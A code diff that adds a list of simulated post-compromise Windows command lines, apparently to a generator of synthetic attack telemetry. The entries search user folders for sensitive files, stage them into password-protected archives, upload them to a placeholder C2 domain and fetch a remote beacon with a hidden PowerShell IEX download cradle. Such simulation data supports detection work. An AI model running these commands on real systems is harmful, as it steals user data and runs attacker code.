@@ -106,6 +106,25 @@ DEFAULT_PERSISTENCE_PAYLOAD_NAMES = ["svchost-update.exe", "winupdate.exe", "edg
 
 
 # ---------------------------------------------------------------------------
+# Hands-on-keyboard operator activity (hands_on_keyboard:operator)
+# Interactive post-compromise commands an operator types through their C2 channel:
+# local collection, archiving/staging, and beaconing. {ip_address} and {domain_name}
+# are replaced with the actor's C2 infrastructure at generation time. Each entry is
+# (process_name, commandline).
+# ---------------------------------------------------------------------------
+HANDS_ON_KEYBOARD_COMMANDS = [
+    ("cmd.exe", 'cmd.exe /c dir C:\\Users\\ /s /b | findstr /i "passw .docx .xlsx .pdf .pst"'),
+    ("powershell.exe", 'powershell.exe -nop -w hidden -c "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Select FullName"'),
+    ("powershell.exe", 'powershell.exe Compress-Archive -Path C:\\Users\\*\\Documents -DestinationPath C:\\Windows\\Temp\\stage.zip -Force'),
+    ("cmd.exe", 'cmd.exe /c rar.exe a -m5 -hp******** C:\\Windows\\Temp\\data.rar C:\\Windows\\Temp\\stage.zip'),
+    ("cmd.exe", "cmd.exe /c net use \\\\{ip_address}\\share /user:svc_backup ********"),
+    ("powershell.exe", 'powershell.exe -nop -c "(New-Object Net.WebClient).UploadFile(\'http://{domain_name}/upload\', \'C:\\Windows\\Temp\\data.rar\')"'),
+    ("cmd.exe", "cmd.exe /c nltest /dclist:."),
+    ("powershell.exe", 'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://{domain_name}/beacon\')"'),
+]
+
+
+# ---------------------------------------------------------------------------
 # Cloud attacks (cloud:session_hijacking / cloud:token_theft / cloud:exfiltration_via_storage)
 # ---------------------------------------------------------------------------
 CLOUD_APPLICATIONS = [
